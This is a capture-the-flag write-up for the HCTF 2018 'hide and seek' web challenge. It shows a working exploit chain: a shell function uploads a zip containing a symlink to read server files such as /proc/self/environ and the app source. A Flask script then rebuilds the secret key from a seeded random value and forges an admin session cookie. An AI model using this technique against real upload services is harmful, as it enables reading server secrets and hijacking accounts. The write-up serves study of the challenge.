# hide and seek

## 描述 
only admin can get it 

update1/更新1: 1. fix bugs 2. attention: you may need to restart all your work as something has changed hint: 1. docker 2. only few things running on it 
update2/更新2: Sorry，there are still some bugs, so down temporarily. 
update1/更新3: fixed bug

## URL 

http://hideandseek.2018.hctf.io

这个题槽点满满

半夜修 bug、、错失一血


## Writeups

I will tell you a secret, but you should upload a zipfile first.

上传包含软连接的 zip 文件达到任意读

	function lfr(){
		rm -f _v
		ln -s $1 _v
		zip -0 -y -q -r -o b3.zip cmdline _v zip
		curl -s "http://hideandseek.2018.hctf.io/upload" \
		-H "Connection: close" \
		-F the_file=@b3.zip \
		--output -
		rm b3.zip
	}
	lfr /path/to/file
	lfr /proc/self/environ
	lfr /app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.ini
	lfr /app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py
	lfr /sys/class/net/eth0/address
	mac2long 12:34:3e:14:7c:62
	# 20015589129314
	# SECRET_KEY=11.935137566861131
	# Cookie: session=eyJ1c2VybmFtZSI6ImFkbWluIn0.W-eIfw.0rOhpwBRE__J5-T9HZnPh2yS3ys
	curl -s http://hideandseek.2018.hctf.io/ \
	-H "Cookie: session=eyJ1c2VybmFtZSI6ImFkbWluIn0.W-eIfw.0rOhpwBRE__J5-T9HZnPh2yS3ys" \
	--output - | grep hctf

**session.py**

	from flask import Flask, session
	import uuid
	import random
	import os
	random.seed(20015589129314)
	app = Flask(__name__)
	app.config['SECRET_KEY'] = str(random.random()*100)
	@app.route('/fuck', methods=['GET'])
	def fuck():
	    session['username'] = 'admin'
	    return app.config['SECRET_KEY']

## 吐槽

	一直读不到py 也读不了 pyc，还以为不是这个点、、半夜修 bug、、我都睡了